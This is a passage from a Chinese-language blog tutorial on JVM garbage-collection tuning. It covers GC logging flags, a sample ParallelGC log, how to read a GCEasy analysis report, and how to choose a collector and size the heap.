GC次数可能会导致单次垃圾回收的时间变长，进而增加单次垃圾回收的“停顿时长”。</p><p>所以， 需要在这两者之间做一些平衡。</p><h2 id="吞吐量、暂停时间、堆内存占用三者之间的关系"><a href="#吞吐量、暂停时间、堆内存占用三者之间的关系" class="headerlink" title="吞吐量、暂停时间、堆内存占用三者之间的关系"></a>吞吐量、暂停时间、堆内存占用三者之间的关系</h2><p>这三个指标不可能同时达到,因为他们是一个不可能的关系</p><p><strong>内存变大,要回收的东西变多,暂停时间自然增加.</strong></p><p><strong>吞吐量增加,必然要降低垃圾回收频率,频率降低,垃圾谁收停顿时间必然增大.</strong></p><p>因此,目前gc的优化方向主要是<strong>吞吐量和暂停时间.</strong></p><h3 id="“高吞吐量”和“低停顿时间”是一对相互竞争的目标"><a href="#“高吞吐量”和“低停顿时间”是一对相互竞争的目标" class="headerlink" title="“高吞吐量”和“低停顿时间”是一对相互竞争的目标"></a>“高吞吐量”和“低停顿时间”是一对相互竞争的目标</h3><p>高吞吐量最好因为这会让应用程序的最终用户感觉只有应用程序线程在做“生产性”工作。</p><p>直觉上，吞吐量越高程序运行越快。</p><p>低停顿时间最好因为从最终用户的角度来看不管是GC还是其他原因导致一个应用被挂起始终是不好的。</p><p>这取决于应用程序的类型，有时候甚至短暂的200毫秒暂停都可能打断终端用户体验。</p><p>因此，具有低的最大停顿时间是非常重要的，特别是对于一个交互式应用程序。</p><p>不幸的是”高吞吐量”和”低停顿时间”是一对相互竞争的目标（矛盾）。</p><p>GC需要一定的前提条件以便安全地运行。</p><p>例如，必须保证应用程序线程在GC线程试图确定哪些对象仍然被引用和哪些没有被引用的时候不修改对象的状态。</p><p>为此，应用程序在GC期间必须停止(或者仅在GC的特定阶段，这取决于所使用的算法)。 然而这会增加额外的线程调度开销：直接开销是上下文切换，间接开销是因为缓存的影响。</p><p>加上JVM内部安全措施的开销，这意味着GC及随之而来的不可忽略的开销，将增加GC线程执行实际工作的时间。</p><p>因此我们可以通过尽可能少运行GC，来最大化吞吐量，例如，只有在不可避免的时候进行GC，来节省所有与它相关的开销。</p><p>然而，仅仅偶尔运行GC意味着每当GC运行时将有许多工作要做，因为在此期间积累在堆中的对象数量很高。 单个GC需要花更多时间来完成， 从而导致更高的平均和最大停顿时间。</p><p>因此，考虑到低停顿时间，最好频繁地运行GC以便更快速地完成。这反过来又增加了开销并导致吞吐量下降，我们又回到了起点。</p><p>综上所述，在设计（或使用）GC算法时，我们必须确定我们的目标：</p><p>一个GC算法只可能针对两个目标之一（即只专注于最大吞吐量或最小停顿时间），或尝试找到一个二者的折衷。</p><h3 id="吞吐量和暂停时间是矛盾的-如何抉择"><a href="#吞吐量和暂停时间是矛盾的-如何抉择" class="headerlink" title="吞吐量和暂停时间是矛盾的,如何抉择?"></a>吞吐量和暂停时间是矛盾的,如何抉择?</h3><p>高吞吐量较好因为这会让应用程序的最终用户感觉只有应用程序线程在做”生产性”工作。直觉上,吞吐量越高程序运行越快。</p><p>低暂停时间(低延迟)较好因为从最终用户的角度来看不管是GC还是其他原因导致一个应用被挂起始终是不好的。这取决于应用程序的类型, 有时候甚至短暂的200毫秒暂停都可能打断终端用户体验 。因此,具有低的较大暂停时间是非常重要的,特别是对于一个 交互式应用程序 。</p><p>不幸的是”高吞吐量”和”低暂停时间”是一对相互竞争的目标(矛盾)。</p><ul><li><p>因为如果选择以吞吐量优先,那么 必然需要降低内存回收的执行频率 ,但是这样会导致GC需要更长的暂停时间来执行内存回收。</p></li><li><p>相反的,如果选择以低延迟优先为原则,那么为了降低每次执行的内存回收时的暂停时间,也 只能频繁地执行内存回收 ,但这又引起了年轻代内存的缩减和导致程序吞吐量的下降。</p></li></ul><p>在设计(或使用)GC算法时,我们必须确定我们的目标: 一个GC算法可能针对两个目标之一(即只专注于较大吞吐量或最小暂停时间),或尝试找到一个二者的折中。</p><p>现在标准: 在最大吞吐量优先的情况下,降低停顿时间</p><h3 id="不同的垃圾回收器有不同的抉择方向"><a href="#不同的垃圾回收器有不同的抉择方向" class="headerlink" title="不同的垃圾回收器有不同的抉择方向:"></a>不同的垃圾回收器有不同的抉择方向:</h3><ul><li><p>Parallel以吞吐量优先</p></li><li><p>cms以停顿时间优先</p></li><li><p>而G1则取折中方案: 在保证用户可接受的停顿时间的前提下,尽可能提高吞吐量.</p></li></ul><p>JVM调优没有万能的公式和标准，因为每个人所面对的场景是不一样。</p><p>要想调整到最优的性能，其实首先要确认的是自己的需求目标是什么(以吞吐量优先&#x2F;停顿时间优先)，</p><p>然后，根据这个目标去慢慢的调整各项指标，从而达到一个最佳的平衡点。</p><h2 id="三：如果获得JVM内存指标"><a href="#三：如果获得JVM内存指标" class="headerlink" title="三：如果获得JVM内存指标?"></a>三：如果获得JVM内存指标?</h2><p>在项目启动的时候 增加下列参数来收集GC日志，然后通过第三方的日志分析工具（比如GCesay:<a href="https://gceasy.io/%EF%BC%89">https://gceasy.io/）</a></p><p>分析收集到的GC日志来得到吞吐量、停顿时间相关的统计数据。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">java    </span><br><span class="line">-XX:+PrintGCDetails -XX:+PrintGCDateStamps   </span><br><span class="line">-XX:+UseGCLogFileRotation   </span><br><span class="line">-XX:+PrintHeapAtGC -XX:NumberOfGCLogFiles=5    </span><br><span class="line">-XX:GCLogFileSize=20M      </span><br><span class="line">-Xloggc:/opt/ard-user-gc-%t.log    </span><br><span class="line">-jar abg-user-1.0-SNAPSHOT.jar </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">-Xloggc:/opt/app/ard-user/ard-user-gc-%t.log   设置日志目录和日志名称  </span><br><span class="line">-XX:+UseGCLogFileRotation           开启滚动生成日志  </span><br><span class="line">-XX:NumberOfGCLogFiles=5            滚动GC日志文件数，默认0，不滚动  </span><br><span class="line">-XX:GCLogFileSize=20M               GC文件滚动大小，需开启UseGCLogFileRotation  </span><br><span class="line">-XX:+PrintGCDetails                 开启记录GC日志详细信息（包括GC类型、各个操作使用的时间）,并且在程序运行结束打印出JVM的内存占用情况  </span><br><span class="line">-XX:+ PrintGCDateStamps             记录系统的GC时间             </span><br><span class="line">-XX:+PrintGCCause                   产生GC的原因(默认开启)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="日志分析工具有哪些？"><a href="#日志分析工具有哪些？" class="headerlink" title="日志分析工具有哪些？"></a>日志分析工具有哪些？</h3><p>我们看到日志，尤其是CMS和G1的日志，直接看日志文档都是很不方便的，密密麻麻的文字，其实市面上已经有一些日志分析工具了。</p><p>进行系统调优时，首先需要对系统的各项指标进行检测。为了有效地进行监测和设置相应的阈值，我们通常会借助监控工具，例如普罗米修斯等。在分析阶段，以下工具是常用的：</p><ol><li><p>VisualVM：</p><p>这是一个功能强大、可扩展的开源工具，用于深入分析Java应用程序。它提供了丰富的功能，包括性能监控、内存使用情况、垃圾回收情况等，并支持线程分析、堆快照等功能。</p></li><li><p>Java Mission Control (JMC)：</p><p>由Oracle提供的专业Java性能监控和故障诊断工具。JMC集成了多种强大功能，包括垃圾回收分析、内存泄漏检测、线程分析等。</p></li><li><p>jvisualvm：</p><p>这是JDK自带的监控和调试工具，可用于监视本地和远程Java应用程序的性能、内存使用情况等。它提供了直观的图形界面和丰富的监控指标。</p></li><li><p>JConsole：</p><p>JConsole是JDK自带的监控工具，提供了基本的图形界面，可用于监视Java应用程序的内存使用情况、线程信息、垃圾回收情况等。</p></li><li><p>GCViewer：</p><p>这是专门用于分析Java应用程序垃圾回收日志的工具。</p><p>GCViewer能将GC日志解析成易于理解的图表和统计信息，帮助用户分析和优化垃圾回收行为。</p></li></ol><p>接下来，介绍使用 gceasy.io 进行 日志分析</p><p>网址：<a href="https://gceasy.io/">https://gceasy.io/</a></p><p>注意：这款工具不需要我们下载软件，他是在线的。</p><p>我们要做的就是两步：</p><p>步骤一：导出GC日志到本地磁盘</p><p>步骤二：将本地日志上传到gceasy.io上，进行分析</p><h3 id="指标分析第一步：导出日志"><a href="#指标分析第一步：导出日志" class="headerlink" title="指标分析第一步：导出日志"></a>指标分析第一步：导出日志</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">\-Xloggc:/Users/lxl/Downloads/gc.log  </span><br><span class="line">\-XX:+PrintGCDetails  </span><br><span class="line">\-XX:+PrintGCDateStamps  </span><br><span class="line">\-XX:+PrintGCTimeStamps  </span><br><span class="line">\-XX:+PrintGCCause  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>‐Xloggc参数：指定gc日志的保存地址。这里指定的是当前目录，文件名以gc-+时间戳.log打印。%t表示时间戳</p></li><li><p>‐XX:+PrintGCDetails：在日志中打印GC详情。</p></li><li><p>‐XX:+PrintGCDateStamps：在日志中打印GC的时间</p></li><li><p>‐XX:+PrintGCTimeStamps：在日志中打印GC耗时</p></li><li><p>‐XX:+PrintGCCause ： [这个参数没查到]</p></li><li><p>‐XX:+UseGCLogFileRotation：这个参数表示以滚动文件的形式打印日志</p></li><li><p>‐XX:NumberOfGCLogFiles：GC日志文件的最大个数，这里设置10个</p></li><li><p>‐XX:GCLogFileSize：GC日志每个文件的最大容量，这里是100M</p></li></ul><p>我们把日志下载到Downloads文件夹下了。以下便是GC日志的全部内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (25.202-b08) for bsd-amd64 JRE (1.8.0\_202-b08), built on Dec 15 2018 20:16:16 by &quot;java\_re&quot; with gcc 4.2.1 (Based on Apple Inc. build 5658) (LLVM build 2336.11.00)  </span><br><span class="line">Memory: 4k page, physical 16777216k(1745536k free)  </span><br><span class="line">/proc/meminfo:  </span><br><span class="line">CommandLine flags: -XX:-BytecodeVerificationLocal -XX:-BytecodeVerificationRemote -XX:InitialHeapSize=268435456 -XX:+ManagementServer -XX:MaxHeapSize=4294967296 -XX:+PrintGC -XX:+PrintGCCause -XX:+PrintGCDateStamps -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:TieredStopAtLevel=1 -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseParallelGC   </span><br><span class="line">2022-01-12T15:02:37.044-0800: 0.839: \[GC (Allocation Failure) \[PSYoungGen: 65536K-&gt;4400K(76288K)\] 65536K-&gt;4416K(251392K), 0.0043915 secs\] \[Times: user=0.01 sys=0.00, real=0.00 secs\]   </span><br><span class="line">2022-01-12T15:02:37.308-0800: 1.103: \[GC (Allocation Failure) \[PSYoungGen: 69936K-&gt;4959K(76288K)\] 69952K-&gt;5047K(251392K), 0.0046449 secs\] \[Times: user=0.02 sys=0.01, real=0.01 secs\]   </span><br><span class="line">2022-01-12T15:02:37.625-0800: 1.420: \[GC (Allocation Failure) \[PSYoungGen: 70495K-&gt;7467K(76288K)\] 70583K-&gt;7563K(251392K), 0.0051392 secs\] \[Times: user=0.02 sys=0.00, real=0.01 secs\]   </span><br><span class="line">2022-01-12T15:02:37.831-0800: 1.627: \[GC (Allocation Failure) \[PSYoungGen: 73003K-&gt;9356K(141824K)\] 73099K-&gt;9460K(316928K), 0.0072596 secs\] \[Times: user=0.03 sys=0.01, real=0.00 secs\]   </span><br><span class="line">2022-01-12T15:02:37.869-0800: 1.664: \[GC (Metadata GC Threshold) \[PSYoungGen: 22322K-&gt;7049K(141824K)\] 22426K-&gt;7161K(316928K), 0.0057809 secs\] \[Times: user=0.02 sys=0.00, real=0.01 secs\]   </span><br><span class="line">2022-01-12T15:02:37.875-0800: 1.670: \[Full GC (Metadata GC Threshold) \[PSYoungGen: 7049K-&gt;0K(141824K)\] \[ParOldGen: 112K-&gt;6873K(87040K)\] 7161K-&gt;6873K(228864K), \[Metaspace: 20573K-&gt;20571K(1067008K)\], 0.0237404 secs\] \[Times: user=0.09 sys=0.01, real=0.02 secs\]   </span><br><span class="line">2022-01-12T15:02:38.392-0800: 2.188: \[GC (Allocation Failure) \[PSYoungGen: 131072K-&gt;7194K(236032K)\] 137945K-&gt;14075K(323072K), 0.0054542 secs\] \[Times: user=0.01 sys=0.01, real=0.00 secs\]   </span><br><span class="line">2022-01-12T15:02:39.850-0800: 3.646: \[GC (Allocation Failure) \[PSYoungGen: 235546K-&gt;9697K(270336K)\] 242427K-&gt;20203K(357376K), 0.0092838 secs\] \[Times: user=0.02 sys=0.01, real=0.01 secs\]   </span><br><span class="line">2022-01-12T15:02:40.479-0800: 4.274: \[GC (Metadata GC Threshold) \[PSYoungGen: 179780K-&gt;12779K(397312K)\] 190286K-&gt;25839K(484352K), 0.0117953 secs\] \[Times: user=0.04 sys=0.01, real=0.02 secs\]   </span><br><span class="line">2022-01-12T15:02:40.491-0800: 4.286: \[Full GC (Metadata GC Threshold) \[PSYoungGen: 12779K-&gt;0K(397312K)\] \[ParOldGen: 13059K-&gt;21448K(132096K)\] 25839K-&gt;21448K(529408K), \[Metaspace: 34068K-&gt;34068K(1079296K)\], 0.0437361 secs\] \[Times: user=0.16 sys=0.01, real=0.04 secs\]   </span><br><span class="line">2022-01-12T15:02:42.177-0800: 5.972: \[GC (Allocation Failure) \[PSYoungGen: 384512K-&gt;13185K(399872K)\] 405960K-&gt;34641K(531968K), 0.0115070 secs\] \[Times: user=0.04 sys=0.01, real=0.01 secs\]   </span><br><span class="line">2022-01-12T15:02:43.010-0800: 6.806: \[GC (Allocation Failure) \[PSYoungGen: 397697K-&gt;16864K(530432K)\] 419153K-&gt;58461K(662528K), 0.0248406 secs\] \[Times: user=0.04 sys=0.02, real=0.02 secs\]   </span><br><span class="line">2022-01-12T15:02:44.338-0800: 8.133: \[GC (Allocation Failure) \[PSYoungGen: 530400K-&gt;26083K(539648K)\] 571997K-&gt;86488K(671744K), 0.0302789 secs\] \[Times: user=0.06 sys=0.02, real=0.03 secs\]   </span><br><span class="line">2022-01-12T15:02:45.800-0800: 9.595: \[GC (Allocation Failure) \[PSYoungGen: 539619K-&gt;32647K(733696K)\] 600024K-&gt;99769K(865792K), 0.0280332 secs\] \[Times: user=0.04 sys=0.02, real=0.02 secs\]   </span><br><span class="line">2022-01-12T15:02:47.765-0800: 11.560: \[GC (Allocation Failure) \[PSYoungGen: 729479K-&gt;41445K(738304K)\] 796601K-&gt;124936K(870400K), 0.0370655 secs\] \[Times: user=0.04 sys=0.02, real=0.04 secs\]   </span><br><span class="line">2022-01-12T15:02:49.620-0800: 13.415: \[GC (Allocation Failure) \[PSYoungGen: 738277K-&gt;26677K(974848K)\] 821768K-&gt;114930K(1106944K), 0.0270382 secs\] \[Times: user=0.05 sys=0.02, real=0.02 secs\]   </span><br><span class="line">2022-01-12T15:02:52.146-0800: 15.942: \[GC (Allocation Failure) \[PSYoungGen: 959541K-&gt;17569K(985600K)\] 1047794K-&gt;110447K(1117696K), 0.0274985 secs\] \[Times: user=0.05 sys=0.01, real=0.03 secs\]   </span><br><span class="line">2022-01-12T15:02:54.110-0800: 17.905: \[GC (Allocation Failure) \[PSYoungGen: 950433K-&gt;10240K(1236480K)\] 1043311K-&gt;109662K(1368576K), 0.0146713 secs\] \[Times: user=0.05 sys=0.01, real=0.01 secs\]   </span><br><span class="line">2022-01-12T15:02:54.692-0800: 18.487: \[GC (Metadata GC Threshold) \[PSYoungGen: 264005K-&gt;3360K(1259520K)\] 363427K-&gt;109573K(1391616K), 0.0086901 secs\] \[Times: user=0.03 sys=0.01, real=0.01 secs\]   </span><br><span class="line">2022-01-12T15:02:54.701-0800: 18.496: \[Full GC (Metadata GC Threshold) \[PSYoungGen: 3360K-&gt;0K(1259520K)\] \[ParOldGen: 106213K-&gt;54092K(208384K)\] 109573K-&gt;54092K(1467904K), \[Metaspace: 56204K-&gt;56204K(1101824K)\], 0.1487173 secs\] \[Times: user=0.69 sys=0.01, real=0.14 secs\]   </span><br><span class="line">2022-01-12T15:02:57.787-0800: 21.583: \[GC (Allocation Failure) \[PSYoungGen: 1209856K-&gt;49146K(1321984K)\] 1263948K-&gt;116260K(1530368K), 0.0339265 secs\] \[Times: user=0.05 sys=0.01, real=0.04 secs\]   </span><br><span class="line">2022-01-12T15:03:16.198-0800: 39.994: \[GC (Allocation Failure) \[PSYoungGen: 1321978K-&gt;29589K(1335296K)\] 1389092K-&gt;101049K(1543680K), 0.0214759 secs\] \[Times: user=0.06 sys=0.01, real=0.03 secs\]   </span><br><span class="line">2022-01-12T15:03:19.021-0800: 42.816: \[GC (GCLocker Initiated GC) \[PSYoungGen: 1302421K-&gt;60915K(1280512K)\] 1373881K-&gt;180735K(1488896K), 0.0482886 secs\] \[Times: user=0.08 sys=0.01, real=0.05 secs\]   </span><br><span class="line">2022-01-12T15:03:21.847-0800: 45.642: \[GC (Allocation Failure) \[PSYoungGen: 1280499K-&gt;89087K(1308672K)\] 1400321K-&gt;228379K(1517056K), 0.0336500 secs\] \[Times: user=0.10 sys=0.01, real=0.04 secs\]   </span><br><span class="line">2022-01-12T15:03:24.516-0800: 48.311: \[GC (Allocation Failure) \[PSYoungGen: 1308671K-&gt;67295K(1257472K)\] 1447963K-&gt;225652K(1465856K), 0.0381420 secs\] \[Times: user=0.07 sys=0.02, real=0.04 secs\]  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="指标分析第二步：导入分析工具，尽心分析"><a href="#指标分析第二步：导入分析工具，尽心分析" class="headerlink" title="指标分析第二步：导入分析工具，尽心分析"></a>指标分析第二步：导入分析工具，尽心分析</h3><p>打开gceasy.io网站，并选择本地的gc文件，然后点击分析。</p><p>（分析的速度根据日志的多少而定，可能会比较慢）</p><p><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/1.png"><br>接下来看看分析结果：</p><h3 id="JVM-memory-size-JVM内存大小"><a href="#JVM-memory-size-JVM内存大小" class="headerlink" title="JVM memory size (JVM内存大小)"></a>JVM memory size (JVM内存大小)</h3><p>GCEasy是一款非常好用的在线分析GC日志的工具，打开官网，直接上传gc日志，也可以更加上门的要求进行压缩上传。<br><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/2.png"><br>这里的Allocated和Peak分别表示可分配空间和峰值</p><ul><li><p><strong>Allocated</strong>：可分配空间大小。</p><p><strong>具体含义如下</strong>：指示为每一代分配的大小。此数据点是从GC日志收集的，因此它可能与JVM系统属性指定的大小相匹配，也可能不匹配。假设您已将总堆大小配置为2gb，而在运行时，如果JVM只分配了1gb，那么在本报告中，您将看到分配的大小仅为1gb</p></li><li><p><strong>Peak：</strong> 分配的峰值。</p><p><strong>具体含义如下</strong>：每一代的峰值内存利用率。通常它不会超过分配的大小。然而，在少数情况下，我们也看到峰值利用率超出了分配的大小，特别是在G1 GC中</p></li></ul><p>JVM memory size ，GCEasy展示了年轻代、老年代、元空间。JVM给分配的大小和程序运行过程中使用的峰值大小。</p><p>从JVM memory size展示的信息，我们可以判断是否需要做下面的几件事情。</p><ul><li><p>是否需要修改JVM内存（-Xms、-Xmx、-Xmn…）相关配置，比如年轻代和老年代峰值远远小于分配的大小，这个时候我们可以适当的减小内存设置。</p></li><li><p>是否需要调整年轻代和老年代的比例(-XX:NewSize(-Xns)、-XX:MaxNewSize(-Xmn)、-XX:SurvivorRatio&#x3D;8)。比如老年大的峰值一直小于老年代申请的内存，这个时候我们可以稍微多分点空间给年轻代。</p></li><li><p>是否需要修改元空间(XX:MetaspaceSize，-XX:MaxMetaspaceSize)相关设置。 <strong>年轻代，老年代属于堆区，元空间属于非堆区（直接对接的是机器的内存）</strong></p></li></ul><h3 id="Key-Performance-Indicatiors（关键指标）"><a href="#Key-Performance-Indicatiors（关键指标）" class="headerlink" title="Key Performance Indicatiors（关键指标）"></a>Key Performance Indicatiors（关键指标）</h3><p><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/3.png"></p><ul><li><p>Throughput：吞吐量。</p><p>指的是处理实际事务花费的时间与GC花费的时间的百分比。这个值越高越好</p></li><li><p>Latency：</p><p>延迟情况。这里的延迟情况是指的GC过程花费的时间。具体含义如上图</p></li></ul><p>Throughput表示的是吞吐量 Latency表示响应时间 Avg Pause GC Time 平均GC时间 Max Pause GC TIme 最大GC时间</p><p>Key Performance Indicators 给我们展示了GC吞吐量（应用程序线程用时占程序总用时的比例，越高越好），每次GC的平均耗时（建议控制在50ms以下），GC最长耗时，每个时间段的GC次数及占比信息。</p><p>通过Key Performance Indicators显示的信息里面，我们需要关注下面几个问题：</p><ul><li><p>吞吐量，应用花在非GC上的时间百分比（引用花在生产任务上的百分比）。所以吞吐量越高越好。</p></li><li><p>每次GC的平均耗时。越小越好，建议50ms以下。</p></li><li><p>GC最长耗时。越小越好。如果你的应用是一个后台程序，并且任何请求不超过10秒，那么GC最长耗时就不能超过10秒。</p></li></ul><h3 id="Interactive-Graphs-交互图"><a href="#Interactive-Graphs-交互图" class="headerlink" title="Interactive Graphs(交互图)"></a>Interactive Graphs(交互图)</h3><p>Interactive Graphs 展示了</p><p><strong>Heap after GC</strong>：GC之后堆的使用情况 <strong>Heap before GC</strong>：GC之前堆的使用情况 <strong>GC Duration</strong>：GC持续时间 <strong>Reclaimed Bytes</strong>：GC回收掉的垃圾对象的内存大小 <strong>Young Gen</strong>：年轻代堆的使用情况 <strong>Old Gen</strong>：老年代堆的使用情况 <strong>Meta Space</strong>：元空间的使用情况 <strong>A &amp; P</strong>：每次GC的时候堆内存分配和晋升情况。其中红色的线表示每次GC的时候年轻代里面有多少内存(对象)晋升到了老年代。</p><p>第一部分是Heap after GC，GC后堆的内存图，堆是用来存储对象的，从图中可以看出，随着GC的进行，垃圾回收器把对象都回收掉了，因此堆的大小逐渐增大。<br><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/4.png"><br>第二部分是Heap before GC，这是GC前堆的使用率，可以看出随着程序的运行，堆使用率越来越高，堆被对象占用的内存越来越大。<br><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/5.png"><br>第三部分是GC Duration Time，就是GC持续时间。一个GC事件的发生具有多个阶段，而不同的垃圾回收器又有不同的阶段，这里展示不作细分。这些阶段（例如并发标记，并发清除等）与程序线程一起并发运行，此时不会暂停程序线程。但是某些阶段（例如初始标记，清除等）会暂停整个应用程序，所以此图标描述的仅暂停阶段所花费的时间。<br><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/6.png"><br>第四部分表示的是GC回收掉的垃圾对象的内存大小。<br><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/7.png"><br>第五部分表示的是Young Gen，年轻代的内存分配情况。对象都是朝生夕死，年轻代存放的就是刚刚产生的对象，每进行一次GC，都会GC掉很多垃圾对象，剩下的就是右GC Root关联的对象，这些对象会年龄会逐渐增加，达到了一定阈值就会晋升为老年代的对象。可以看到before GC表示的图线随着时间的进行逐渐增大，也就是年轻代中对象越来越多，而GC事件发生后，年轻代中对象就会减少，也就是after GC图线表示的内存变化趋势。<br><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/8.png"><br>第六部分是Old Gen，表示的是老年代的内存分配情况。细心的读者会发现，为啥一开始before GC的内存大小比after GC的内存分配要少呢？这里得先知道老年代存放的都是年龄大的对象，意思就是经过了多次GC都没有被GC掉的对象，就会晋升为老年代的对象。所以这就解释了为啥after GC内存要比before GC内存要大，因为每次GC过后，都会有年轻代的对象晋升为老年代对象。<br><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/9.png"><br>第七部分是每次GC的时候堆内存分配和晋升情况。其中红色的线表示每次GC的时候年轻代里面有多少内存(对象)晋升到了老年代。<br><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/10.png"></p><h3 id="GC-Statistics-GC统计信息"><a href="#GC-Statistics-GC统计信息" class="headerlink" title="GC Statistics(GC统计信息)"></a>GC Statistics(GC统计信息)</h3><p><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/11.png"><br>每种GC总共回收了多少内存、总共用了多长时间、平均时间、以及每种GC的单独统计信息啥的。</p><h3 id="Object-Stats-对象的一些统计信息"><a href="#Object-Stats-对象的一些统计信息" class="headerlink" title="Object Stats(对象的一些统计信息)"></a>Object Stats(对象的一些统计信息)</h3><p><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/12.png"></p><h3 id="GC-Causes-GC的原因信息"><a href="#GC-Causes-GC的原因信息" class="headerlink" title="GC Causes(GC的原因信息)"></a>GC Causes(GC的原因信息)</h3><p><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/13.png"></p><h3 id="Memory-Leak"><a href="#Memory-Leak" class="headerlink" title="Memory Leak"></a>Memory Leak</h3><p>由于记录的程序没有内存泄漏，所以这里就没有内存泄漏的日志信息。</p><p>此处可以诊断8种OOM中的5种（Java堆内存溢出，超出GC开销限制，请求数组大小超过JVM限制，Permgen空间，元空间）。</p><h2 id="四：JVM-常用配置策略"><a href="#四：JVM-常用配置策略" class="headerlink" title="四：JVM 常用配置策略"></a>四：JVM 常用配置策略</h2><h3 id="垃圾回收器的选择"><a href="#垃圾回收器的选择" class="headerlink" title="垃圾回收器的选择"></a>垃圾回收器的选择</h3><p>选择垃圾回收器时，应根据CPU核心数、关注点（吞吐量或用户停顿时间）以及JDK版本等因素做出合适的选择，以提高应用程序的性能和稳定性。</p><ul><li><p><strong>CPU单核：</strong></p><p>当系统仅有单核CPU时，Serial垃圾收集器是最佳选择。</p><p>由于单核系统的性能瓶颈主要集中在单一处理器上，使用Serial垃圾收集器能够简化垃圾回收的过程，提高系统的整体性能。</p></li><li><p><strong>CPU多核：关注吞吐量</strong></p><p>对于多核CPU且关注系统吞吐量的情况，推荐选择Parallel Scavenge（PS）加 Parallel Old（PO）的组合。</p><p>这种组合利用了多核CPU的并行处理能力，通过并行处理新生代和老年代的垃圾收集，以提高系统的吞吐量和整体性能。</p></li><li><p><strong>CPU多核，关注用户停顿时间，JDK版本1.6或1.7：</strong></p><p>如果系统是多核CPU，并且更关注用户停顿时间，特别是在JDK版本为1.6或1.7的情况下，推荐选择Concurrent Mark-Sweep（CMS）垃圾收集器。</p><p>CMS垃圾收集器以减少应用程序停顿时间为目标，通过与应用程序线程并发执行部分垃圾回收操作，从而降低了GC造成的停顿时间，提高了系统的响应速度和用户体验。</p></li><li><p><strong>CPU多核，关注用户停顿时间，JDK1.8及以上，JVM可用内存6G以上：</strong></p><p>对于JDK版本为1.8及以上，并且系统具备充足的内存资源（6G及以上），且依然关注用户停顿时间的情况，推荐选择Garbage-First（G1）垃圾收集器。</p><p>G1垃圾收集器是一种面向服务端应用的垃圾收集器，具有高效的垃圾回收、可预测的停顿时间和良好的内存整理能力，适用于对用户停顿时间有较高要求的应用场景。</p></li></ul><p><strong>垃圾回收器的选择 的切换配置：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">//设置Serial垃圾收集器（新生代）  </span><br><span class="line"> 开启：-XX:+UseSerialGC  </span><br><span class="line">   </span><br><span class="line"> //设置PS+PO,新生代使用功能Parallel Scavenge 老年代将会使用Parallel Old收集器  </span><br><span class="line"> 开启 -XX:+UseParallelOldGC  </span><br><span class="line">   </span><br><span class="line"> //CMS垃圾收集器（老年代）  </span><br><span class="line"> 开启 -XX:+UseConcMarkSweepGC  </span><br><span class="line">   </span><br><span class="line"> //设置G1垃圾收集器  </span><br><span class="line"> 开启 -XX:+UseG1GC  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="JVM参数常用原则"><a href="#JVM参数常用原则" class="headerlink" title="JVM参数常用原则"></a>JVM参数常用原则</h3><ul><li><p>对于JVM堆的设置</p><p>通常我们会使用 <strong>-Xms</strong> 和 <strong>-Xmx</strong> 来设定最小和最大堆大小，将它们设置为相同的值可以防止垃圾收集器在堆大小之间进行收缩，从而减少额外的时间消耗。</p></li><li><p>年轻代和年老代的大小将根据默认比例（通常为1：2）分配堆内存。</p><p>我们可以通过调整 <strong>-XX:NewRatio</strong> 参数来调整它们之间的比例，</p><p>也可以通过 <strong>-XX:NewSize</strong> 和 <strong>-XX:MaxNewSize</strong> 来设置年轻代的绝对大小。</p><p>为了防止年轻代堆大小的调整，通常将 <strong>-XX:NewSize</strong> 和 <strong>-XX:MaxNewSize</strong> 设置为相同大小。</p></li><li><p>年轻代和年老代大小的合理设置没有标准答案，因此调优时需要观察它们大小变化对系统的影响。</p><p>更大的年轻代会延长普通GC周期但增加每次GC的时间，而更小的年老代会导致更频繁的Full 